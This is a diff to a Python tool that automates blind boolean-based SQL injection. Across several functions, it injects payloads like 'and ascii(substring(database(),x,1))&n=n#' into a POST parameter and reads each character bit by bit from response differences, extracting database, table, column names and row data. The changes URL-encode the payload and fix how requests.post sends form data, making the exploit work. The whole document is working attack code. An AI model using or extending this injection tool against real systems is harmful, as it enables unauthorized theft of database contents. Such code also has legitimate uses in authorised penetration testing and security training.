@@ -84,10 +84,10 @@ def database_name(
         for n in binary_number:
             payloads[attack_parameter_name] = (
                 attack_parameter_value
-                + f"'and ascii(substring(database(),{x},1))&{n}={n}#"
+                + f"'and ascii(substring(database(),{x},1))%26{n}={n}%23"
             )
 
-            resp = requests.post(URL, payloads)
+            resp = requests.post(URL, data=payloads)
             if control_point in resp.text:
                 binary_result += n
             else:
@@ -123,7 +123,7 @@ def table_name(
                     attack_parameter_value
                     + f"'and ascii(substring(({query} limit {i},1),{x},1))&{n}={n}#"
                 )
-                resp = requests.post(URL, payloads)
+                resp = requests.post(URL, data=payloads)
                 if control_point in resp.text:
                     binary_result += n  # sum of binary numbers
                 else:
@@ -163,7 +163,7 @@ def column_name(
                     + f"'and ascii(substring(({query} limit {i},1),{x},1))&{n}={n}#"
                 )
 
-                resp = requests.post(URL, payloads)
+                resp = requests.post(URL, data=payloads)
                 if control_point in resp.text:
                     binary_result += n  # sum of binary numbers
                 else:
@@ -237,7 +237,7 @@ def query_data_start(
                     + f"'and ascii(substring(({query} limit {i},1),{x},1))&{n}={n}#"
                 )
 
-                resp = requests.post(URL, payloads)
+                resp = requests.post(URL, data=payloads)
                 if control_point in resp.text:
                     binary_result += n  # sum of binary numbers
                     binary_length += n
